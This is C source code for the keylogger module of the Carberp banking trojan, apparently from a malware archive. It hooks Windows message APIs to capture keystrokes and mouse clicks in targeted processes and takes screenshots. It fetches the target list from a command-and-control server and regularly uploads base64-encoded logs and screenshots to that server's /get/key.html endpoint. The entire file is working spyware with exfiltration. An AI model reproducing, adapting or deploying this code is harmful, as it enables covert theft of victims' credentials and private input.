/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <windowsx.h>

#include "GetApi.h"
#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
//#include "Crypt.h"
#include "Unhook.h"
#include "Splice.h"
#include "Task.h"
#include "Config.h"
#include "Crypt.h"

#include "BotConfig.h"
#include "Loader.h"
#include "KeyLogger.h"
#include "Screens.h"
#include "md5.h"

// ��� ������� ������� �� ����� ������ ��� KeyLogger
typedef BOOL ( WINAPI *PPeekMessage )( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                                       UINT wMsgFilterMax, UINT wRemoveMsg );

typedef BOOL ( WINAPI *PGetMessage )( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                                      UINT wMsgFilterMax);

typedef BOOL (WINAPI* PCloseWindow)(HWND hWnd);

// ������������� ��� ANSI, ��� � UNICODE
static PCloseWindow Real_CloseWindow; 

static PGetMessage	Real_GetMessageA;
static PPeekMessage	Real_PeekMessageA;

static PGetMessage	Real_GetMessageW;
static PPeekMessage	Real_PeekMessageW;

static void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd);
static void ProcessCharMessageW(LPMSG lpMsg, HWND hWnd);

static void ProcessMouseMessageA(LPMSG lpMsg, HWND hWnd);
static void ProcessMouseMessageW(LPMSG lpMsg, HWND hWnd);

static void DumpKeyLogBufA();
static void DumpKeyLogBufW();

// ����� ��� ������ �������� ����������� ��� ������������� ���������
// � �������� ��� ���������� ����������, �� ����� ���� ������ �-� init/shutdown_keyloger
static CHAR  g_szKeyLogBufA[0x400] = {'\0'};
static WCHAR g_szKeyLogBufW[0x400] = {L'\0'};
static WCHAR SysPath1[0x400];// = {L'\0'};

static HWND g_KeyLoghWnd = 0;
static LONG g_KeyLogbPosA = 0;
static LONG g_KeyLogbPosW = 0;


char DownloadHach[15];
WCHAR sHach[15];
WCHAR wcharHachFile[15];
WCHAR ScrName[MAX_PATH];
DWORD screen_md5;


bool WriteToCurFile(WCHAR * FileName,char * WriteData )
{
	bool ex=false;
	if ( (DWORD)pGetFileAttributesW( FileName ) == -1 ) ex=true;
	HANDLE hFile = (HANDLE)pCreateFileW( SysPath1, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
	if (hFile!=INVALID_HANDLE_VALUE)
	{
		if (ex)
		{
			
			DWORD dwBytesRead;
			PCHAR WriteD=STR::New(8,ToAnsi(ScrName),"\r\n",DownloadHach,"\r\n",ToAnsi(&sHach[0]),"\r\n",ToAnsi(wcharHachFile),"\r\n");
			WriteFile(hFile,WriteD,m_lstrlen(WriteD),&dwBytesRead,NULL);
			STR::Free(WriteD);
		}
		DWORD dwSiseFile=0;
		DWORD dwBytesRead=0;
		pSetFilePointer(hFile, 0, NULL, FILE_END);
		pWriteFile(hFile,WriteData,m_lstrlen(WriteData),&dwBytesRead,NULL);		
		pWriteFile(hFile,"\r\n",2,&dwBytesRead,NULL);	
		pCloseHandle(hFile);
		return true;
	}

	return false;
}
void scrShot()
{
	typedef int ( WINAPI *fwsprintfW )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfW pwsprintfW = (fwsprintfW)GetProcAddressEx( NULL, 3, 0xEA3AF0C1 );
	//������� �����
	screen_md5=SetScreensThread(&ScrName[0]);
	// ��� ������ ����� �������� ������� ����� ����������
	m_memset(wcharHachFile,0,15*sizeof(WCHAR));
	pwsprintfW((LPTSTR)wcharHachFile, (LPCTSTR)L"0x%u", screen_md5);

}

/************************************************************************/
void DumpKeyLogBufA()
{
	if (0 != g_KeyLogbPosA)
	{
		// ������ ����� ������ � ������
		g_szKeyLogBufA[g_KeyLogbPosA] = '\0';

		char *OutBuf = (char *)MemAlloc(1024);
		char *ClsBuf = (char *)MemAlloc(MAX_PATH);
		if (OutBuf && ClsBuf)
		{
			pGetClassNameA(g_KeyLoghWnd, ClsBuf, MAX_PATH - 1);
			RECT hRect;
			pGetWindowRect(g_KeyLoghWnd,&hRect);
			
			if ( (DWORD)pGetFileAttributesW( &ScrName[0] ) == -1 )
			{
				
			}

			wsprintfA(OutBuf, "[%d,%d,%d,%d]hWnd: %x: WndClass: %s Symbols: %s",hRect.left,hRect.top,hRect.right,hRect.left, g_KeyLoghWnd, ClsBuf, g_szKeyLogBufA);
			pOutputDebugStringA(OutBuf);
			WriteToCurFile(&SysPath1[0],OutBuf);

			MemFree(ClsBuf);
			MemFree(OutBuf);
		}

		g_KeyLogbPosA = 0;
	}
}

/************************************************************************/
void DumpKeyLogBufW()
{
	if (0 != g_KeyLogbPosW)
	{
		// ������ ����� ������ � ������
		g_szKeyLogBufW[g_KeyLogbPosW] = L'\0';

		WCHAR *OutBuf = (WCHAR *)MemAlloc(1024);
		WCHAR *ClsBuf = (WCHAR *)MemAlloc(MAX_PATH);
		if (OutBuf && ClsBuf)
		{
			pGetClassNameW(g_KeyLoghWnd, ClsBuf, MAX_PATH - 1);
			RECT hRect;
			pGetWindowRect(g_KeyLoghWnd,&hRect);
			
			POINT p1,p2;
			p1.x=hRect.left;
			p1.y=hRect.top;
			p2.x=hRect.right;
			p2.y=hRect.bottom;
			ScreenToClient(g_KeyLoghWnd,&p1);
			ScreenToClient(g_KeyLoghWnd,&p2);
			
			wsprintfW(OutBuf, L"[%d,%d,%d,%d]hWnd: %x: WndClass: %s Symbols: %s",p1.x,p1.y,p2.x,p2.y, g_KeyLoghWnd, ClsBuf, g_szKeyLogBufW);
			pOutputDebugStringW(OutBuf);
			WriteToCurFile(&SysPath1[0],ToAnsi(OutBuf));

			MemFree(ClsBuf);
			MemFree(OutBuf);
		}

		g_KeyLogbPosW = 0;
	}
}

/************************************************************************/
void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd)
{
	// ���� � ����� ������ ��� ���� ������
	if (0 == g_KeyLoghWnd) 
	{
		// ���������� ����� ����
		g_KeyLoghWnd = lpMsg->hwnd;
	}
	
	// ���� ����������� ������� ������� � ��� �� ����� ����, �� ���������
	// ������ � �����
	if (g_KeyLoghWnd == lpMsg->hwnd)
	{
		// ������ ��������?
		if (lpMsg->wParam >= 32)
			g_szKeyLogBufA[g_KeyLogbPosA++] = (char)lpMsg->wParam;
		else
		// ������������ �����������
		{
			static char szWord[20] = {'\0'};
			switch (lpMsg->wParam)
			{
				case VK_RETURN:
					{

						plstrcpyA(szWord, "{Enter}");
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						plstrcpyA(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
						break;
					}
				case VK_BACK:
					{
						plstrcpyA(szWord, "{BackSpace}"); 
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						plstrcpyA(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
						break;
					}
				default:
					{
						wsprintfA(szWord, "{#%0x}", lpMsg->wParam);
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						plstrcpyA(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
					}
			}// case
		}
	}
	else
	// ���� ��� ��� ������ ����, �� ������ ����� � �������� ��������� ���
	// � ������ ������
	{
		DumpKeyLogBufA();

		// ���������� ����� ����
		g_KeyLoghWnd = lpMsg->hwnd;

		g_szKeyLogBufA[g_KeyLogbPosA++] = (char)lpMsg->wParam;
	}
}

/************************************************************************/
void ProcessCharMessageW(LPMSG lpMsg, HWND hWnd)
{
	// ���� � ����� ������ ��� ���� ������
	if (0 == g_KeyLoghWnd) 
		g_KeyLoghWnd = lpMsg->hwnd;

	// ���� ����������� ������� ������� � ��� �� ����� ����, �� ���������
	// ������ � �����
	if (g_KeyLoghWnd == lpMsg->hwnd)
	{
		// ������ ��������?
		if (lpMsg->wParam >= 32)
			g_szKeyLogBufW[g_KeyLogbPosW++] = lpMsg->wParam;
		else
		// ������������ �����������
		{
			static WCHAR szWord[20] = {L'\0'};
			switch (lpMsg->wParam)
			{
				case VK_RETURN:
					{
						lstrcpyW(szWord, L"{Enter}");
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
						break;
					}
				case VK_BACK:
					{
						lstrcpyW(szWord, L"{BackSpace}"); 
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
						break;
					}
				default:
					{
						wsprintfW(szWord, L"{#%0x}", lpMsg->wParam);
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
					}
			}// case		
		}
	}
	else
	// ���� ��� ��� ������ ����, �� ������ ����� � �������� ��������� ���
	// � ������ ������
	{
		DumpKeyLogBufW();
		g_KeyLoghWnd = lpMsg->hwnd;
		g_szKeyLogBufW[g_KeyLogbPosW++] = lpMsg->wParam;
	}
}

/************************************************************************/
void ProcessMouseMessageA(LPMSG lpMsg, HWND hWnd)
{
	static char szMouseBtn[20] = {'\0'};
	static char szBuf[50] = {'\0'};
	
	if ((lpMsg->wParam & MK_LBUTTON) == MK_LBUTTON)
		lstrcpy(szMouseBtn, "{Click}"); else
	if ((lpMsg->wParam & MK_RBUTTON) == MK_RBUTTON)
		lstrcpy(szMouseBtn, "{RClick}");

	if ( (DWORD)pGetFileAttributesW( &ScrName[0] ) == -1 )
	{
		scrShot();
	}

	wsprintfA(szBuf, "%s (x=%d;y=%d)", szMouseBtn,
						GET_X_LPARAM(lpMsg->lParam), GET_Y_LPARAM(lpMsg->lParam));
	pOutputDebugStringA(szBuf);
	WriteToCurFile(&SysPath1[0],szBuf);
}

/************************************************************************/
void ProcessMouseMessageW(LPMSG lpMsg, HWND hWnd)
{
	static WCHAR szMouseBtn[20] = {L'\0'};
	static WCHAR szBuf[50] = {L'\0'};
	
	if ((lpMsg->wParam & MK_LBUTTON) == MK_LBUTTON)
		lstrcpyW(szMouseBtn, L"{Click}"); else
	if ((lpMsg->wParam & MK_RBUTTON) == MK_RBUTTON)
		lstrcpyW(szMouseBtn, L"{RClick}");

	if ( (DWORD)pGetFileAttributesW( &ScrName[0] ) == -1 )
	{
		scrShot();
	}

	wsprintfW(szBuf, L"%s (x=%d;y=%d)", szMouseBtn,
						GET_X_LPARAM(lpMsg->lParam), GET_Y_LPARAM(lpMsg->lParam));
	OutputDebugStringW(szBuf);
	WriteToCurFile(&SysPath1[0],ToAnsi(szBuf));
}


BOOL WINAPI Hook_CloseWindow(HWND hWnd)
{

	return Real_CloseWindow(hWnd);
}
/************************************************************************/
BOOL WINAPI Hook_PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                              UINT wMsgFilterMax, UINT wRemoveMsg)
{
	if (PM_REMOVE & wRemoveMsg)
	{
		switch (lpMsg->message)
		{
			case WM_SYSCOMMAND:
			{
				// ALT+F4
				if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
				{
					DumpKeyLogBufA();
				}
				break;
			}
			case WM_COPY:
			case WM_PASTE:
			{

			}
			case WM_CHAR:
			{
				ProcessCharMessageA(lpMsg, hWnd);
				break;
			}
			case WM_LBUTTONDOWN:
			case WM_RBUTTONDOWN:
			{
				// ���� ����� ������, �� ������ �����
				if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
				{
					DumpKeyLogBufA();
				}
				// ��� �������� ��������� ���� ������� �������� ����������� ����������, �����
				// ���� ��������� �������� �� ����������
				BOOL res = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
				ProcessMouseMessageA(lpMsg, hWnd);
				return res;
			}
		}
	}
	return Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
}

/************************************************************************/
BOOL WINAPI Hook_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                              UINT wMsgFilterMax, UINT wRemoveMsg)
{															
	if (PM_REMOVE & wRemoveMsg)
	{
		switch (lpMsg->message)
		{
			case WM_SYSCOMMAND:
			{
				// ALT+F4
				if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
				{
					DumpKeyLogBufW();
				}
				break;
			}
			case WM_CHAR:
			{
				ProcessCharMessageW(lpMsg, hWnd);
				break;
			}
			case WM_LBUTTONDOWN:
			case WM_RBUTTONDOWN:
			{
				// ���� ����� ������, �� ������ �����
				if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
				{
					DumpKeyLogBufW();
				}
				// ��� �������� ��������� ���� ������� �������� ����������� ����������, �����
				// ���� ��������� �������� �� ����������
				BOOL res = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
				ProcessMouseMessageW(lpMsg, hWnd);
				return res;
			}
		}
	}
	return Real_PeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
}

/************************************************************************/
BOOL WINAPI Hook_GetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                             UINT wMsgFilterMax)
{
	switch (lpMsg->message)
	{
		case WM_SYSCOMMAND:
		{
			// ALT+F4
			if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
			{
				DumpKeyLogBufW();
			}
			break;
		}
		case WM_CHAR:
		{
			ProcessCharMessageW(lpMsg, hWnd);
			break;
		}
		case WM_LBUTTONDOWN:
		case WM_RBUTTONDOWN:
		{
			// ���� ����� ������, �� ������ �����
			if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
			{
				DumpKeyLogBufW();
			}
			// � ������� �� PeekMessage ����� ��� ���
			// ���� ��������� ���������, ������� �������� ��� ����������
			ProcessMouseMessageW(lpMsg, hWnd);
		}
	}
	return Real_GetMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}


/************************************************************************/
BOOL WINAPI Hook_GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                             UINT wMsgFilterMax)
{
	switch (lpMsg->message)
	{
		case WM_SYSCOMMAND:
		{
			// ALT+F4
			if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
			{
				DumpKeyLogBufA();
			}
			break;
		}
		case WM_CHAR:
		{
			ProcessCharMessageA(lpMsg, hWnd);
			break;
		}
		case WM_LBUTTONDOWN:
		case WM_RBUTTONDOWN:
		{
			// ���� ����� ������, �� ������ �����
			if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
			{
				DumpKeyLogBufA();
			}
			// � ������� �� PeekMessage ����� ��� ���
			// ���� ��������� ���������, ������� �������� ��� ����������
			ProcessMouseMessageA(lpMsg, hWnd);
		}
	}
	return Real_GetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}

DWORD StrHachToDWORD(char*HachStr)
{
	int i=m_lstrlen(HachStr)-1;
	DWORD count=0;
	int rang=1;
	while(HachStr[i]!='x')
	{
		if(HachStr[i]=='1')
			count +=1*rang;
		else
		if(HachStr[i]=='2')
			count +=2*rang;
		else
		if(HachStr[i]=='3')
			count +=3*rang;
		else
		if(HachStr[i]=='4')
			count +=4*rang;
		else
		if(HachStr[i]=='5')
			count +=5*rang;
		else
		if(HachStr[i]=='6')
			count +=6*rang;
		else
		if(HachStr[i]=='7')
			count +=7*rang;
		else
		if(HachStr[i]=='8')
			count +=8*rang;
		else
		if(HachStr[i]=='9')
			count +=9*rang;
		else
		if(HachStr[i]=='A'||HachStr[i]=='a')
			count +=10*rang;
		else
		if(HachStr[i]=='B'||HachStr[i]=='B')
			count +=11*rang;
		else
		if(HachStr[i]=='C'||HachStr[i]=='c')
			count +=12*rang;
		else
		if(HachStr[i]=='D'||HachStr[i]=='d')
			count +=13*rang;
		else
		if(HachStr[i]=='E'||HachStr[i]=='e')
			count +=14*rang;
		else
		if(HachStr[i]=='F'||HachStr[i]=='f')
			count +=15*rang;
		else
		if(HachStr[i]=='0')
		{}
		else
			return 0;
		if (rang==1) 
			rang=16;
		else
			rang=rang*16;
		i--;
	}
	return count;
}
/************************************************************************/
bool WINAPI IsKeyLoggerProcess()
{
	// ������� ������ ������ ���� ��� ������� � ��������
	// Java.exe ��� Javaw.exe

	

	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH*sizeof (WCHAR) );
	if ( ModulePath == NULL )return false;
	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );



	DWORD dwBytesRead;
	char DataPath[1024];
	
	WCHAR * path= (WCHAR*)MemAlloc( MAX_PATH *sizeof (WCHAR));
	if ( path == NULL )return false;
	m_memset(path,0,MAX_PATH *sizeof (WCHAR));
	m_memset(DataPath,0,1024);

	WCHAR szFileFolderBuf[]= {'\\','K','Y','L',L'\0'};//
	WCHAR szFileBuf[]= {'\\','f','i','.','d','a','t',L'\0'};//
	pSHGetFolderPathW(NULL, 0x001a, NULL, 0, SysPath1);
	plstrcatW( SysPath1, szFileFolderBuf );
	plstrcpyW( path, SysPath1 );
			
	
	plstrcatW( path, szFileBuf );//�� ���� � �������� �����

	//	����
//	����� ������ ����� ��������� ������ �� �����
	HANDLE hFile = (HANDLE)pCreateFileW( path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	if (hFile==INVALID_HANDLE_VALUE)return false;	

	pReadFile(hFile,&DataPath[0],1024,&dwBytesRead,NULL);		
	pCloseHandle(hFile);

	bool fleg=false;
	int i;
	char *cUrl=&DataPath[0],*cUrlNext;
	while (true)
	{// ��������� ���� �� � ������ ��� �������
		cUrl= m_strstr(&cUrl[0],"0x");
		if (cUrl==NULL)break;
		cUrlNext= m_strstr(cUrl,"|");
		i=m_lstrlen(cUrl)-m_lstrlen(cUrlNext);
		m_memset(DownloadHach,0,10);			
		m_lstrncpy(DownloadHach,cUrl,i);
		DownloadHach[i]='\0';
		if (StrHachToDWORD(DownloadHach)==dwProcessHash)
		{
			fleg=true;
			break;
		}		
		cUrl= m_strstr(&cUrl[1],"0x");
	}

	if (fleg )//��������� ����� �����, ������...
	{
		
		typedef int ( WINAPI *fwsprintfW )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfW pwsprintfW = (fwsprintfW)GetProcAddressEx( NULL, 3, 0xEA3AF0C1 );
		
		DWORD hachFileName =GetUniquePID();
		WCHAR szBuf[25];
		m_memset(szBuf,0,25*sizeof(WCHAR));

		//��������� ��� ����� ����
		plstrcpyW(ScrName, SysPath1);
		pwsprintfW((LPTSTR)szBuf, (LPCTSTR)L"\\hash%u.dats", hachFileName);		
		plstrcatW( SysPath1, szBuf );
		
		//��������� ��� �������
		WCHAR szBuf1[25];
		m_memset(szBuf1,0,25*sizeof(WCHAR));
		pwsprintfW((LPTSTR)szBuf1, (LPCTSTR)L"\\scr%u.jpg", hachFileName);		
		plstrcatW( ScrName, szBuf1 );
		
		//�������������� ���������
		InitScreenLib();
		
		//��� ������� �����, �� ���������� �� ����� ��� �����
		m_memset(sHach,0,15*sizeof(WCHAR));
		pwsprintfW((LPTSTR)sHach, (LPCTSTR)L"0x%u", CalcHashW( szBuf ));
	
		pOutputDebugStringW(SysPath1);
	
		MemFree( ModulePath );
		return true;
	}

	MemFree( path );
	MemFree( ModulePath );/**/
	return false;
}

/************************************************************************/
bool HookKeyLoggerApi()
{
	
//���������� ���������� ����� ������� �������� � ������ ����
//�� ������� ���� ����� ��� � ���� 
//������ �� ����� ������
//���������� ���  ��� ����� �-�� ouputdebugstring(��� � ����� ������ � �������)

	if ( HookApi( 3, 0xD7A87C2C, (DWORD)&Hook_PeekMessageA ) )
	{  
		__asm mov [Real_PeekMessageA], eax			
	}	

	if ( HookApi( 3, 0xC8A274AC, (DWORD)&Hook_GetMessageA ) )
	{  
		__asm mov [Real_GetMessageA], eax			
	}	

	if ( HookApi( 3, 0xD7A87C3A, (DWORD)&Hook_PeekMessageW ) )
	{  
		__asm mov [Real_PeekMessageW], eax			
	}	

	if ( HookApi( 3, 0xC8A274BA, (DWORD)&Hook_GetMessageW ) )
	{  
		__asm mov [Real_GetMessageW], eax			
	}

	/*if ( HookApi( 3, 0xF23EB1BF, (DWORD)&Hook_CloseWindow ) )
	{  
		__asm mov [Real_CloseWindow], eax			
	}*/
	//DbgMsg("HookKeylogerApi",0,"AFTER");
	
	return true;
}


/************************************************************************/
bool HookKeyLogger()
{
	// ������� ������ ���� �� ������� ������� ������� ����������
	// KeyLogger ��� ������ � ����������� ����
	//
	

	if ( !IsKeyLoggerProcess() )
	{
		return false;
	}

	UnhookKeyLogger();

	HookKeyLoggerApi();

	return true;
}
DWORD GetByteFileHash( LPBYTE FileContent, DWORD dwFileSize )
{	
	//���������� ��� ��5 ����������� ������� ����

	LPBYTE pbyFile  = FileContent;

	char Hash[33];
	m_memset( Hash, 0, 33 );

	if ( pbyFile != NULL )
	{
		MD5_CTX ctx;	

		MD5Init(&ctx);
		MD5Update( &ctx, (unsigned char*)pbyFile, dwFileSize );

		unsigned char buff[16];	

		MD5Final( buff, &ctx );

		typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

		int p = 0;

		for( int i = 0; i < 16; i++ )
		{
			_pwsprintfA( &Hash[p], "%02X", buff[i] );
			p += 2;
		}	
		
		Hash[32] = '\0';	
	}

	if ( !m_lstrlen( Hash ) )
	{
		return -1;
	}

	return CalcHash( Hash );
}

LPBYTE ReadOpenDirectory(int FlagFolderDest,WCHAR *Path, WCHAR *Ext)
{
	WCHAR SysPath[MAX_PATH];//�������� ���� � �������� ����������
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, 0, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	if (SysPath[(int)plstrlenW(SysPath)-1]!='\\')
		plstrcatW( SysPath, L"\\" );
	// ������� ���������� ����� � ����������� Ext �� ���������� Path 
	// ���������� ����� ������ �������� ������
	if (Path == NULL || Ext == NULL)
		return NULL;
	
	// ���������� ���������� �� �����
	
	WCHAR Mask[MAX_PATH];
	plstrcpyW(Mask,SysPath);
	plstrcatW(Mask,Ext);

	WIN32_FIND_DATAW Search;
	HANDLE File = pFindFirstFileW(Mask, &Search);
	if (File == INVALID_HANDLE_VALUE)
	{
		
		return NULL;
	}
	//LPBYTE hResult=NULL;
	DWORD dwGlobSiz=0;
	// ���������� ��������� �����
	while (File != NULL)
	{
        if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
		{
			// ������� ����
			WCHAR FileName[MAX_PATH];
			m_memset(FileName,0,MAX_PATH);
			plstrcpyW(FileName,SysPath);
			plstrcatW(FileName,Search.cFileName);

			//PCHAR FileName = STR::New(2, Path, Search.cFileName);
			//  � ������ ���� ���� ����� ������� "������ ������" ������
			//  ��� ��������
			if ((Search.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0)
				pSetFileAttributesW(FileName, FILE_ATTRIBUTE_ARCHIVE);
			{
				DWORD dwWriteB=0;
				LPBYTE Data=GetFileData(FileName,&dwWriteB);//������ ����
				if (dwWriteB)
				if (Data!=NULL)
				{
				
					//��� �������
					char* lpData1=(char*)Data;			
					char* lpData=m_strstr((char*)lpData1,"\r\n");					
					DWORD ttt=(lpData-(char*)lpData1);
					PCHAR fFileName=STR::New((PCHAR)lpData1,ttt);

					//��� �������� �����
					lpData1=lpData+2;			
					lpData=m_strstr((char*)lpData1,"\r\n");					
					ttt=(lpData-(char*)lpData1);
					PCHAR Hach=STR::New((PCHAR)lpData1,ttt);
					
					//��� �������
					lpData1=lpData+2;			
					lpData=m_strstr((char*)lpData1,"\r\n");					
					ttt=(lpData-(char*)lpData1);
					PCHAR sHach=STR::New((PCHAR)lpData1,ttt);

					//��� �� ��5 ����� ������
					lpData1=lpData+2;			
					lpData=m_strstr((char*)lpData1,"\r\n");					
					ttt=(lpData-(char*)lpData1);
					PCHAR pScreen_md5=STR::New((PCHAR)lpData1,ttt);
					lpData=lpData+2;	
					

					
					DWORD iCount=lpData-(char*)Data;
					//�������� ������ ��� ��������
					PCHAR SData	= BASE64::Encode((LPBYTE)lpData,dwWriteB-iCount);
					if (SData!=NULL)
					{
						PCHAR BotID =GenerateBotID();
											
						
						PMultiPartData Data = MultiPartData::Create();

						MultiPartData::AddStringField(Data, "id"		, BotID);
						MultiPartData::AddStringField(Data, "type"		, "2");
						MultiPartData::AddStringField(Data, "hash"		, Hach);
						MultiPartData::AddStringField(Data, "shash"		, sHach);
						MultiPartData::AddStringField(Data, "screen_md5", pScreen_md5);
						MultiPartData::AddStringField(Data, "log"		, SData);
						MultiPartData::AddFileField	 (Data, "screen"	, fFileName, NULL);

						PCHAR Buf = NULL;	
						PCHAR pHost=GetCurrentHost2();
						PCHAR Host = STR::New(3, "http://", pHost, "/get/key.html");

						HTTP::Post(Host, Data, &Buf);
						
						STR::Free(pHost);
						STR::Free(Host);
						STR::Free(Buf);
						MultiPartData::Free(Data);

					}
					
					STR::Free(SData);

					dwGlobSiz=dwWriteB;
					/*if (Data!=NULL)
						pDeleteFileW(FileName);// ������� ����
					*/MemFree(Data);

				}				
			}
        }
		// �������� ��������� ����
		if (!pFindNextFileW(File, &Search)) break;
	}

	// ����������� ������
	
	pFindClose(File);

	return NULL;
}
bool DownloadHachList(PCHAR URL,PCHAR *HTMLCode)
{
	// ��������� �������, ������ ������ ����� ������� ����������
	if (URL == NULL)
		return false;
	PCHAR BotID =GenerateBotID();

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "id", BotID);
	AddURLParam(Fields, "type", "1");
    STR::Free(BotID);
	bool Result = HTTP::Post(URL, Fields, HTMLCode);

	Strings::Free(Fields);
    return Result;
}

DWORD WINAPI SendLoadedThred( LPVOID lpData )
{
	//����� ��� �������� ����� ��� ������ � ������������ ��������� � ��� ������
	char Host[MAX_PATH];
	m_lstrcpy( Host, GetCurrentHost());	
	m_lstrcat( Host, "/get/key.html");	

	PCHAR Command = NULL;
	while(true)	
	{
		WCHAR SysPath_[MAX_PATH];//�������� ���� � �������� ����������
		pSHGetFolderPathW(NULL, 0x001a, NULL, 0, SysPath_);
		plstrcatW( SysPath_, L"\\" );
		plstrcatW( SysPath_, L"KYL\\");
		while((BOOL)pCreateDirectoryW(SysPath_,NULL))
		{	}
		if (DownloadHachList(Host, &Command))
		{		
			if (m_strstr(Command,"<HEAD>"))continue;
			if (m_strstr(Command,"\r\n"))
			{
				PCHAR Data= STR::GetRightStr(Command,"\r\n");
				PCHAR DataToWr= STR::GetLeftStr(Data,"\r\n");
				FileCreateInFolder(0x001a,L"KYL\\fi.dat",DataToWr,m_lstrlen(DataToWr));	
				STR::Free(Data);
				STR::Free(DataToWr);
			}
			else 
				while (!FileCreateInFolder(0x001a,L"KYL\\fi.dat",Command,m_lstrlen(Command)))
				{}	
		
			STR::Free(Command);
		
			break;
		}
	}
	while (true)
	{
		pSleep(5*1000*60);
		LPBYTE lDat=ReadOpenDirectory(0x001a,L"KYL", L"*.dats");
	}
}
void SendLoadedFiles()
{
	StartThread(SendLoadedThred,NULL);
}

DWORD WINAPI SetScreensThread( LPVOID lpData )
{
	//�������� ���� � ����� WCHAR � ����� ������ ����� �� ��5 ����� ������ ��� � ���������� ���

	LPVOID lpScrFile;
	DWORD dwScrSize;
	DWORD Result=0;
	
	GetScreen( &lpScrFile, &dwScrSize );
	bool bAddScreen  = false;
	WCHAR *ScreenFile = (WCHAR*)lpData;//GetTempNameA();

	if ( lpScrFile && ScreenFile )
	{										
		HANDLE hScreen = (HANDLE)pCreateFileW( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

		if ( hScreen != INVALID_HANDLE_VALUE )
		{
			DWORD dwWritten = 0;

			if ( (BOOL)pWriteFile( hScreen, lpScrFile, dwScrSize, &dwWritten, 0 ) )
			{
				bAddScreen = true;
			}

		} 
		Result= GetByteFileHash((LPBYTE)lpScrFile,dwScrSize);

		pCloseHandle( hScreen );
		MemFree(lpScrFile);		
	}
	
	return Result;

}

